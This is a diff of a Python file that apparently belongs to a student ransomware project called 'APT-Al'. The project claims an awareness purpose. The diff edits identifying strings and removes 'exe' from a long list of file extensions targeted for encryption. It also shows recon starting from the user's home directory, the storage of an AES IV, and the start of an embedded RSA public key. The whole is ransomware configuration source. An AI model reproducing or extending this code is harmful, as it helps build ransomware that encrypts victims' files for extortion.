@@ -3,15 +3,13 @@ from datetime import datetime
 
 who_we_are = "APT-Al"
 version = "v1.1"
-what_is_my_purpose = """
-Hi there,
+what_is_my_purpose = """Hi there,
 we are a group of university students from Hacettepe.
-We aim that the main reason for starting the project is increasing awareness of cybersecurity by informing people.
-"""
+We aim that the main reason for starting the project is increasing awareness of cybersecurity by informing people."""
 
 what_is_my_name = "zararliyim.exe"
-what_is_my_id = "1"+"\n" # ransomwareID
-when_did_i_work = datetime.now().strftime("%d/%m/%Y %H:%M:%S")+"\n"
+what_is_my_id = "1"# ransomwareID
+when_did_i_work = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
 # the beginning point of recon
 root_directory = os.path.expanduser('~')
@@ -32,7 +30,7 @@ aesIV_file_store_path = os.path.join(desktop_directory,str(_count_of_file)+aesIV
 file_extentions = [ '7z', 'ai', 'aif', 'apk', 'arj', 'asp', 'aspx', 'avi', 
                     'bak', 'bat', 'bin', 'bmp', 'c', 'cab', 'cda', 'cfg', 
                     'cgi', 'class', 'cpp', 'cs', 'css', 'csv', 'dat', 'db', 
-                    'dbf', 'deb', 'dmg', 'doc', 'docx', 'eml', 'exe', 'fnt', 
+                    'dbf', 'deb', 'dmg', 'doc', 'docx', 'eml', 'fnt', 
                     'fon', 'htm', 'html', 'ico', 'iso', 'jar', 'java', 'jpeg', 
                     'jpg', 'js', 'json', 'jsp', 'key', 'log', 'mdb', 'mid', 'midi', 
                     'mov', 'mp3', 'mp4', 'mpa', 'mpg', 'msg', 'msi', 'odp', 
@@ -41,7 +39,7 @@ file_extentions = [ '7z', 'ai', 'aif', 'apk', 'arj', 'asp', 'aspx', 'avi',
                     'rtf', 'sh', 'sql', 'svg', 'swift', 'sys', 'tar', 'tif', 
                     'tiff', 'toast', 'txt','vb', 'wav', 'wma', 'wpl', 'wsf', 
                     'xhtml', 'xls', 'xml', 'xslm', 'xslx', 'zip']
-
+# exe deleted
 
 aes_IV_key_length = 16
 rsa_public_key = "-----BEGIN RSA PUBLIC KEY-----\n\
